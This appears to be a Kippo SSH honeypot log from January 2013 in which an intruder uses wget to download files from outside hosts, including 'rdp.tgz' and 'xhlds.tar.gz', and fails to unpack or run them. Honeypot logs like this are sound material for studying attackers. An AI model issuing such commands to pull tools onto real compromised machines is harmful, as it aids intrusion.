[4hAWSWeb:~# ping
[4lUsage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
[4hAWSWeb:~# wget http://kippo.googlecode.com/svn/trunk/kippo/commands/adduser.py
[4l--2013-01-31 12:51:06--  http://kippo.googlecode.com/svn/trunk/kippo/commands/adduser.py
Connecting to kippo.googlecode.com:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3442 (3K) [text/plain]
Saving to: `adduser.py

74% [============================>          ] 2,550        24K/s  eta 0s100%[======================================>] 3,442        24K/s

2013-01-31 12:51:06 (24 KB/s) - `adduser.py' saved [3442/3442]
[4hAWSWeb:~# wget http://kippo.googlecode.com/svn/trunk/kippo/commands/wget.py
[4l--2013-01-31 12:52:02--  http://kippo.googlecode.com/svn/trunk/kippo/commands/wget.py
Connecting to kippo.googlecode.com:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8802 (8K) [text/plain]
Saving to: `wget.py

45% [=================>                     ] 3,983        76K/s  eta 0s100%[======================================>] 8,802        76K/s

2013-01-31 12:52:02 (76 KB/s) - `wget.py' saved [8802/8802]
[4hAWSWeb:~# http://freewebtown.com/maanu/rdp.tgz
bash: http://freewebtown.com/maanu/rdp.tgz: command not found
AWSWeb:~# wget http://freewebtown.com/maanu/rdp.tgz
[4l--2013-01-31 13:01:27--  http://freewebtown.com/maanu/rdp.tgz
Connecting to freewebtown.com:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8957 (8K) [text/html; charset=UTF-8]
Saving to: `rdp.tgz

13% [=====>                                 ] 1,193        6K/s  eta 1s100%[======================================>] 8,957        6K/s

2013-01-31 13:01:28 (6 KB/s) - `rdp.tgz' saved [8957/8957]
[4hAWSWeb:~# ./start
bash: ./start: command not found
AWSWeb:~# /config
bash: /config: command not found
AWSWeb:~# cs rdp
bash: cs: command not found
AWSWeb:~# cd rdp
[4lbash: cd: rdp: No such file or directory
[4hAWSWeb:~# tar -pxzf rdp.r
[4ltar: rdp.r: Cannot open: No such file or directory
tar: Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error exit delayed from previous errors
[4hAWSWeb:~# tar -pxzf rdp.tgz
[4ltar: this does not look like a tar archive
tar: skipping to next header
tar: error exit delayed from previous errors
[4hAWSWeb:~# wget http://xhlds.com/downloads/xhlds.tar.gz
[4l--2013-01-31 13:06:56--  http://xhlds.com/downloads/xhlds.tar.gz
Connecting to xhlds.com:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 135624 (132K) [application/octet-stream]
Saving to: `xhlds.tar.gz

 1% [>                                      ] 1,448        4K/s  eta 29s100%[======================================>] 135,624      4K/s

2013-01-31 13:06:57 (4 KB/s) - `xhlds.tar.gz' saved [135624/135624]
[4hAWSWeb:~# cd xhlds
[4lbash: cd: xhlds: No such file or directory
[4hAWSWeb:~# 